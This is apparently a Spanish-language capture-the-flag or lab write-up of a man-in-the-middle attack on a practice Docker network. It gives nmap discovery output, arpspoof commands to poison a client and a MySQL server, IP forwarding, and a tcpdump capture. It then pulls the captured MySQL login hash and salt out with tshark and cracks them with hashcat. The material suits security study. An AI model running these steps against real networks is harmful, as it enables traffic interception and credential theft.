# Obtener la IP del host

```sh
dig NS <url>
```

# Conectarse por ssh a un puerto especifico

```sh
ssh -p 22222 user@ip
```

# Donde corre la base de datos?

Desde la maquina que tiene acceso a la red LAN del objetivo
Obtuve lo siguiente:

```txt
root@7f6350d5c97b:~# nmap -sS 172.18.0.1-255
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-06 04:11 UTC
Nmap scan report for 172.18.0.1
Host is up (0.000027s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:DA:71:81:04 (Unknown)

Nmap scan report for client.arp_spoofing_homme_du_milieu_default (172.18.0.3)
Host is up (0.000035s latency).
All 1000 scanned ports on client.arp_spoofing_homme_du_milieu_default (172.18.0.3) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 02:42:AC:12:00:03 (Unknown)

Nmap scan report for db.arp_spoofing_homme_du_milieu_default (172.18.0.4)
Host is up (0.000035s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:04 (Unknown)

Nmap scan report for 7f6350d5c97b (172.18.0.2)
Host is up (0.000018s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 255 IP addresses (4 hosts up) scanned in 2.48 seconds
root@7f6350d5c97b:~#
```

Donde nos sirve que en el puerto 3306, esta corriendo mysql

# Como engañar a la base de datos y a mi amigo?

## De esta forma engañas diciendo "soy X"
```sh
# Engaña a la VÍCTIMA para que crea que tu IP es la del ROUTER
arpspoof -i eth0 -t <IP_VICTIMA> <IP_ROUTER>

# En otra terminal, engaña al ROUTER para que crea que tu IP es la de la VÍCTIMA
arpspoof -i eth0 -t <IP_ROUTER> <IP_VICTIMA>
```

## De esta forma les reenvias los paquetes para que no detecten perdida de conexion
```sh
sudo sysctl -w net.ipv4.ip_forward=1
```

## Luego para ver lo que se estan mandando `tcpdump`
```sh
sudo tcpdump -i eth0 -w captured.capng
```

# Hipotesis que saco con ips resueltas

1. Activar forwarding
2. Engañar a mi amigo (el que tiene todos los puertos cerrados) que soy la BD
3. Engañar a la BD (mysql) que soy mi amigo
4. Hacer un tcp dump de la info que esten intercambiando


# Del capng obtuve estos paquetes que estan interesantes porque sabemos
- db name  = flagdb
- username = user

 2559  46.362445   172.18.0.4 → 172.18.0.3   TCP 74 [TCP Retransmission] 3306 → 46608 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM TSval=2372940128 TSecr=1315112706 WS=128
 2560  46.362491   172.18.0.3 → 172.18.0.4   TCP 66 46608 → 3306 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1315112706 TSecr=2372940128
 2561  46.362494   172.18.0.3 → 172.18.0.4   TCP 66 [TCP Dup ACK 2560#1] 46608 → 3306 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=1315112706 TSecr=2372940128
 2562  46.362870   172.18.0.4 → 172.18.0.3   MySQL 144 Server Greeting  proto=10 version=5.7.42
 2563  46.362877   172.18.0.4 → 172.18.0.3   TCP 144 [TCP Retransmission] 3306 → 46608 [PSH, ACK] Seq=1 Ack=1 Win=65280 Len=78 TSval=2372940129 TSecr=1315112706
 2564  46.362933   172.18.0.3 → 172.18.0.4   TCP 66 46608 → 3306 [ACK] Seq=1 Ack=79 Win=64256 Len=0 TSval=1315112707 TSecr=2372940129
 2565  46.362937   172.18.0.3 → 172.18.0.4   TCP 66 [TCP Dup ACK 2564#1] 46608 → 3306 [ACK] Seq=1 Ack=79 Win=64256 Len=0 TSval=1315112707 TSecr=2372940129
 2566  46.364891   172.18.0.3 → 172.18.0.4   MySQL 354 Login Request user=user db=flagdb
 2567  46.364899   172.18.0.3 → 172.18.0.4   TCP 354 [TCP Retransmission] 46608 → 3306 [PSH, ACK] Seq=1 Ack=79 Win=64256 Len=288 TSval=1315112709 TSecr=2372940129
 2568  46.364928   172.18.0.4 → 172.18.0.3   TCP 66 3306 → 46608 [ACK] Seq=79 Ack=289 Win=65024 Len=0 TSval=2372940131 TSecr=1315112709
 2569  46.364933   172.18.0.4 → 172.18.0.3   TCP 66 [TCP Dup ACK 2568#1] 3306 → 46608 [ACK] Seq=79 Ack=289 Win=65024 Len=0 TSval=2372940131 TSecr=1315112709
 2570  46.365101   172.18.0.4 → 172.18.0.3   MySQL 88 Response  OK


## Usando mas informacion del paquete 2566, podemos obtener usr, pass, etc si lo consultamos explicitamente

```sh
root@7f6350d5c97b:~# tshark -r copy.capng -Y "frame.number == 2566" -T fields -e ip.src -e ip.dst -e mysql.user -e mysql.passwd -E header=y
Running as user "root" and group "root". This could be dangerous.
ip.src  ip.dst  mysql.user      mysql.passwd
172.18.0.3      172.18.0.4      user    cf864a10ebb9948c212647766d06534955ec28c0
```


## Luego podemos obtener el plugin que se usa de contraseña para sql

```sh
root@7f6350d5c97b:~# tshark -r copy.capng -Y "mysql.server_greeting" -T fields -e ip.src -e mysql.auth_plugin -E header=y
Running as user "root" and group "root". This could be dangerous.
ip.src  mysql.auth_plugin
172.18.0.4      mysql_native_password
```

> [!NOTE]
> Sabemos que mysql_native_password usa un sistema de "salt" + hash para encriptar contraseñas, por lo que lo que podemos
> hacer es conseguir esa salt y junto con hashcat decriptar la contraseña dada



### Conseguimos la salt

Esto se hace usando wireshark, buscando el mysql.server_greeting y buscas la salt adentro del paquete (va a haber dos) y
tambien te dice el tipo de plugin que se va a usar, en este caso mysql_native_password

parte1:
5360566a68011f3900
parte2:
37325638572a555c57553d6100


## Luego decriptamos la contraseña

- Creo el hash para hashcat:

```txt
# $mysqlna$<salt>:<hashed_password>
$mysqlna$2f01175c66365c627e64724f0e352c17221e20215f3e:cf864a10ebb9948c212647766d06534955ec28c0
```


### Para decriptarla usamos hashcat y un archivo con esa linea

```sh
hashcat -m 11200 -a 0 hash_listo.txt rockyou.txt
```


